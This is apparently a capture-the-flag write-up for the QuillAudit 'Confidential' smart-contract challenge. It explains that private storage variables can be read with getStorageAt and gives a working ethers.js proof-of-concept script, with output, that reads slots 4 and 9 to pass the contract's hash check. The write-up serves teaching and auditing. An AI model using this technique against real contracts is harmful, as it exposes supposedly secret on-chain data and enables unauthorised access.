# QuillAudit CTF Confidential

## Vulnerability:

The vulnerability arises from the assumption that private variables of a smart contract cannot be accessed at all. Though private variables do not have getter functions automatically generated like public vars, they can be read if we know the storage memory layout.

Each storage slot is 32 bytes which can contain a single variable or if properly fit, can have multiple smaller size variables in the same slot. In this case, slots 4 and 9 corresponding to “aliceHash” and “bobHash” respectively give us the required private data to exploit the contract.

## Attack Steps:

Get the variables stored at slot position 4 and 9.

To get these slots, use **_getStorageAt()_** which takes as parameters, the contract address and the number of slot we want to access.

After getting the bytes32 data, pass these as parameters to the hash function of the contract.

The result of this step is sent as a parameter to the **_checkthehash()_** function.

## POC:

```jsx
const API_KEY = "";
const PRIVATE_KEY = "";
const CONTRACT_ADDRESS = "0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66";

const contract = require("path/Confidential.json");

// console.log(JSON.stringify(contract.abi));
const alchemyProvider = new ethers.providers.AlchemyProvider(
  (network = "goerli"),
  API_KEY
);
const signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider);
const contractInstance = new ethers.Contract(
  CONTRACT_ADDRESS,
  contract.abi,
  signer
);

async function exec() {
  const slot4 = await alchemyProvider.getStorageAt(contractInstance.address, 4);
  const slot9 = await alchemyProvider.getStorageAt(contractInstance.address, 9);
  console.log(slot4);
  console.log(slot9);
  const resHash = await contractInstance.hash(slot4, slot9);
  const result = await contractInstance.checkthehash(resHash);
  console.log(result); //true
}
exec();
```

```bash
npx hardhat run scripts/Confidential.js
0x448e5df1a6908f8d17fae934d9ae3f0c63545235f8ff393c6777194cae281478
0x98290e06bee00d6b6f34095a54c4087297e3285d457b140128c1c2f3b62a41bd
true
```
